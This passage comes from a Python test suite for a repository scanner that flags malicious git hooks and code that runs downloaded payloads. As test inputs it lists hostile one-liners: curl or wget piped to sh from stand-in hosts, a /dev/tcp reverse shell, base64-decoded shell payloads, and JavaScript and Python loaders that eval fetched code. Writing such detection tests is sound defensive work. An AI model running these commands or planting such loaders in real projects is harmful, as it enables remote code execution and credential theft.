        assert f.evidence[0].quote == "curl -s https://hooks.example-cdn.net/pc.sh | bash"

    def test_husky_with_lint_staged_and_commitlint_is_clear(self):
        f = finding(BENIGN, self.CHECK)
        assert f.status == "clear"
        assert "lint-staged" in f.evidence[0].summary and "commitlint" in f.evidence[0].summary

    @pytest.mark.parametrize("line", [
        "npm test", "yarn lint", "pnpm run lint", "npx tsc --noEmit", "npx --no-install jest --bail",
        "pytest -q", "ruff check .", "black --check .", "go vet ./...", "cargo fmt -- --check",
        'echo "Commit format: https://www.conventionalcommits.org"', "exec < /dev/tty && npx cz --hook || true",
        'if ! npx lint-staged; then\n  exit 1\nfi', "make lint", "npx eslint --rule 'no-eval: error' .",
        "ruby -c app.rb", "git diff --cached --name-only | node scripts/check.js",
    ])
    def test_ordinary_hooks_are_clear(self, line):
        files = {"package.json": pkg(lint="eslint .", test="vitest run"), ".husky/pre-push": HUSKY_HEADER + line + "\n"}
        assert status(files, self.CHECK) == "clear", line

    @pytest.mark.parametrize("line", [
        "wget -q https://x.example/a -O- | sh", "node -e \"require('child_process').exec('id')\"",
        "bash -c 'source <(cat https://x.example/a)'", "powershell -w hidden -c Start-Process calc",
        "echo aWQ= | base64 -d | sh", "python3 -c 'import os'", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        'eval "$HOOK_CMD"', "cat .git/x | sh",
    ])
    def test_unusual_hooks_hit(self, line):
        assert status({".husky/post-checkout": line + "\n"}, self.CHECK) == "hit", line

    def test_hook_running_a_script_that_downloads(self):
        files = {".husky/pre-commit": HUSKY_HEADER + "./scripts/check.sh\n",
                 "scripts/check.sh": "#!/bin/sh\nset -e\nwget -qO /tmp/x https://x.example/x && chmod +x /tmp/x\n"}
        f = finding(files, self.CHECK)
        assert f.status == "hit" and "scripts/check.sh" in f.evidence[0].summary

    def test_hook_running_a_node_script_without_network_is_clear(self):
        files = {".githooks/commit-msg": "node scripts/verify-commit.js\n",
                 "scripts/verify-commit.js": "const msg = require('fs').readFileSync(process.argv[2], 'utf8');\n"}
        assert status(files, self.CHECK) == "clear"

    def test_hook_running_an_npm_script_that_downloads(self):
        files = {"package.json": pkg(check="curl -s https://x.example/c | sh"), ".husky/pre-push": "npm run check\n"}
        f = finding(files, self.CHECK)
        assert f.status == "hit" and "check script" in f.evidence[0].summary

    def test_lefthook(self):
        bad = "pre-commit:\n  commands:\n    lint:\n      run: npx eslint {staged_files}\n    sync:\n      run: curl -s https://x.example/s | sh\n"
        good = "pre-commit:\n  parallel: true\n  commands:\n    lint:\n      run: npx eslint {staged_files}\n"
        assert status({"lefthook.yml": bad}, self.CHECK) == "hit"
        assert status({"lefthook.yml": good}, self.CHECK) == "clear"

    def test_pre_commit_config(self):
        local = ("repos:\n- repo: local\n  hooks:\n  - id: setup\n    name: setup\n"
                 "    entry: bash -c 'curl -s https://x.example/a | sh'\n    language: system\n")
        remote = ("repos:\n- repo: https://github.com/psf/black\n  rev: 24.1.0\n  hooks:\n  - id: black\n"
                  "- repo: local\n  hooks:\n  - id: pytest\n    name: pytest\n    entry: pytest\n    language: system\n")
        odd = "repos:\n- repo: https://git.evil-host.example/hooks\n  rev: v1\n  hooks:\n  - id: x\n"
        assert status({".pre-commit-config.yaml": local}, self.CHECK) == "hit"
        assert status({".pre-commit-config.yaml": remote}, self.CHECK) == "clear"
        assert status({".pre-commit-config.yaml": odd}, self.CHECK) == "hit"

    def test_hooks_in_package_json(self):
        simple = json.dumps({"name": "x", "simple-git-hooks": {"pre-commit": "npx lint-staged"}})
        husky4 = json.dumps({"name": "x", "husky": {"hooks": {"pre-push": "node -e \"eval(process.env.X)\""}}})
        yorkie = json.dumps({"name": "x", "gitHooks": {"pre-commit": "lint-staged"}})
        assert status({"package.json": simple}, self.CHECK) == "clear"
        assert status({"package.json": husky4}, self.CHECK) == "hit"
        assert status({"package.json": yorkie}, self.CHECK) == "clear"

    def test_core_hooks_path_set_by_a_script(self):
        files = {"package.json": pkg(postinstall="git config core.hooksPath tools/hooks"),
                 "tools/hooks/pre-commit": "#!/bin/sh\ncurl -s https://x.example/p | sh\n"}
        f = finding(files, self.CHECK)
        assert f.status == "hit" and "tools/hooks/pre-commit (set by package.json)" in f.evidence[0].summary

    def test_hooks_path_outside_the_repo_hits(self):
        assert status({"setup.sh": "git config core.hooksPath ~/.cache/h\n"}, self.CHECK) == "hit"

    def test_script_writing_into_git_hooks_and_downloading(self):
        code = ("const fs = require('fs');\nconst https = require('https');\n"
                "https.get(u, r => r.pipe(fs.createWriteStream('.git/hooks/pre-commit')));\n")
        assert status({"scripts/postinstall.js": code}, self.CHECK) == "hit"

    def test_no_hooks_is_clear(self):
        f = finding({"package.json": pkg(test="jest")}, self.CHECK)
        assert f.status == "clear" and "doesn't set up any git hooks" in f.evidence[0].summary

    def test_unreadable_hook_is_unknown(self):
        files = with_skipped({"README.md": "x"}, {".husky/pre-commit": 2_000_000})
        assert {x.check: x for x in scan_repo(files)}[self.CHECK].status == "unknown"


# ---------------------------------------------------------------- S10 downloaded code run as code

class TestDownloadedCode:
    CHECK = "S10_runs_downloaded_code"

    def test_new_function_require_res_data(self):
        f = finding(MALICIOUS, self.CHECK)
        assert f.status == "hit"
        ev = [e for e in f.evidence if e.source == "server/config/index.js"]
        assert ev and "new Function" in ev[0].summary and "res.data.cookie" in ev[0].quote

    @pytest.mark.parametrize("code", [
        "axios.get(u).then(r => eval(r.data));",
        "axios.get(u).then(function (response) {\n  eval(response.data);\n});",
        "const { data } = await axios.get(u);\neval(data);",
        "const res = await fetch(u);\nconst code = await res.text();\nnew Function(code)();",
        "eval(await (await fetch(u)).text());",
        "fetch(u).then(r => r.text()).then(eval);",
        "request(u, (err, resp, body) => { vm.runInThisContext(body); });",
        "const x = new XMLHttpRequest();\nx.onload = () => eval(x.responseText);\nx.open('GET', u); x.send();",
        "http.get(u, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => eval(d)); });",
        "(async () => { const r = await axios.post(u, {k}); new (Function.constructor)('require', r.data.cookie)(require); })();",
    ])
    def test_javascript_loaders(self, code):
        assert status({"server/a.js": code}, self.CHECK) == "hit", code

    @pytest.mark.parametrize("code", [
        "import requests\nexec(requests.get(u).text)\n",
        "import requests\nr = requests.get(u, timeout=5)\nexec(r.text)\n",
        "from urllib.request import urlopen\nexec(urlopen(u).read())\n",
        "import urllib.request\nwith urllib.request.urlopen(u) as resp:\n    payload = resp.read()\nexec(payload)\n",
    ])
    def test_python_loaders(self, code):
        assert status({"app/a.py": code}, self.CHECK) == "hit", code

    def test_webpack_runtime_is_clear(self):
        runtime = (
            '/***/ "./src/index.js":\n/***/ ((module, __webpack_exports__, __webpack_require__) => {\n'
            'eval("__webpack_require__.r(__webpack_exports__);\\n/* harmony import */ var axios = '
            '__webpack_require__(\\"axios\\");\\naxios.get(url).then(function (response) { console.log(response.data); });");\n'
            "/***/ }),\n"
            "__webpack_require__.hmrM = () => {\n"
            "  return fetch(__webpack_require__.p + __webpack_require__.hmrF()).then((response) => {\n"
            "    if(response.status === 404) return;\n"
            "    return response.json();\n  });\n};\n"
            '/***/ "./src/b.js": (() => { eval("var x = 1;\\n//# sourceURL=webpack:///./src/b.js"); })\n')
        assert status({"dist/main.js": runtime}, self.CHECK) == "clear"

    def test_lodash_template_is_clear(self):
        lodash = ("var result = attempt(function() {\n"
                  "  return Function(importsKeys, sourceURL + 'return ' + source).apply(undefined, importsValues);\n"
                  "});\n")
        assert status({"node_lib/lodash.template.js": lodash}, self.CHECK) == "clear"

    def test_eval_of_a_constant_near_a_fetch_is_clear(self):
        code = "fetch('/api').then(r => r.json()).then(show);\nconst two = eval('1 + 1');\n"
        assert status({"src/a.js": code}, self.CHECK) == "clear"

    def test_eval_of_an_unrelated_variable_is_clear(self):
        code = "const res = await fetch('/api');\nconst expr = document.getElementById('calc').value;\neval(expr);\n"
        assert status({"src/calc.js": code}, self.CHECK) == "clear"

    def test_axios_far_from_eval_is_clear(self):
        code = ("axios.get(u).then(res => render(res.data));\n" + "// filler line of ordinary code\n" * 80
                + "eval(res);\n")
        assert status({"src/a.js": code}, self.CHECK) == "clear"

    def test_fetch_and_json_parse_is_clear(self):
        code = "fetch(u).then(r => r.text()).then(t => { const data = JSON.parse(t); render(data); });\n"
        assert status({"src/a.js": code}, self.CHECK) == "clear"

    def test_regex_exec_on_a_response_is_clear(self):
        code = "const r = await fetch(u);\nconst m = /v(\\d+)/.exec(await r.text());\n"
        assert status({"src/a.js": code}, self.CHECK) == "clear"

    def test_benign_repo_is_clear(self):
        assert status(BENIGN, self.CHECK) == "clear"
